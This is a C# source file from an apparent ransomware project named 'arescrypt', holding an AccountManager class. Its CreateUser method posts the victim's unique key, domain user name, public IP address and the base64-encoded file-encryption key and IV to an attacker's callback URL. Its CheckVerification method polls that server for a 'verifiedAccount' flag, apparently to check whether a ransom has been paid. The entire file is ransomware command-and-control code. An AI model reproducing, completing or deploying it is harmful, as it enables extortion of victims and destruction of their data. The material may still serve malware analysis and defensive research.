using System;
using System.Net;
using Newtonsoft.Json.Linq;

namespace arescrypt
{
    class AccountManager
    {
        private UserData userData = new UserData();

        public bool CheckVerification()
        {
            string url = Configuration.callbackURL + 
                "?uniqueKey=" + userData.getUniqueKey() +
                "&userDomUser=" + Configuration.userDomUser;

            using (WebClient wc = new WebClient())
            {
                string response = wc.DownloadString(url);
                JToken jsonObject = JObject.Parse(response);
                return (bool)jsonObject.SelectToken("verifiedAccount");
            }
        }

        public bool CreateUser()
        {
            JToken IPInfo = JObject.Parse(Miscellaneous.GetPublicIPAddress());
            string userIPAddr = (string)IPInfo.SelectToken("ip");

            string userParams = "uniqueKey=" + userData.getUniqueKey() +
                "&userDomUser=" + Configuration.userDomUser +
                "&userIPAddr=" + userIPAddr +
                "&encKey=" + Convert.ToBase64String(Cryptography.encKey) +
                "&encIV=" + Convert.ToBase64String(Cryptography.encIV);
            
            using (WebClient wc = new WebClient())
            {
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                string response = wc.UploadString(Configuration.callbackURL, userParams);

                Console.WriteLine("Response: \"" + response + "\"");
                JToken jsonObject = JObject.Parse(response);
                return (bool)jsonObject.SelectToken("verifiedAccount");
            }
        }
        
    }
}
